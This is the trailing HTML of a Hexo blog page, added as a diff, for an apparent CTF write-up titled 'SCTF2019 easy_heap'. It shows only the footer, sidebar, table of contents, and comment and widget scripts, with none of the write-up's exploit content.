+                one_heap <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="ama2in9" />
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">65</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hwhxy.github.io/" title="HWHXY" target="_blank">HWHXY</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF2019-easy-heap"><span class="nav-number">1.</span> <span class="nav-text">SCTF2019 easy_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法1"><span class="nav-number">1.1.</span> <span class="nav-text">解法1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-py"><span class="nav-number">1.1.1.</span> <span class="nav-text">exp.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法2-17"><span class="nav-number">1.2.</span> <span class="nav-text">解法2(17)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#17-py"><span class="nav-number">1.2.1.</span> <span class="nav-text">17.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法3-官方-x3h1n"><span class="nav-number">1.3.</span> <span class="nav-text">解法3(官方+x3h1n)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关于各种结构体及名词"><span class="nav-number">1.3.1.</span> <span class="nav-text">关于各种结构体及名词</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击原理"><span class="nav-number">1.3.2.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x3h1n-py"><span class="nav-number">1.3.3.</span> <span class="nav-text">x3h1n.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">1.4.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://yoursite.com/2020/09/03/SCTF2019/easy_heap/';
+        this.page.identifier = '2020/09/03/SCTF2019/easy_heap/';
+        this.page.title = 'easy_heap';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
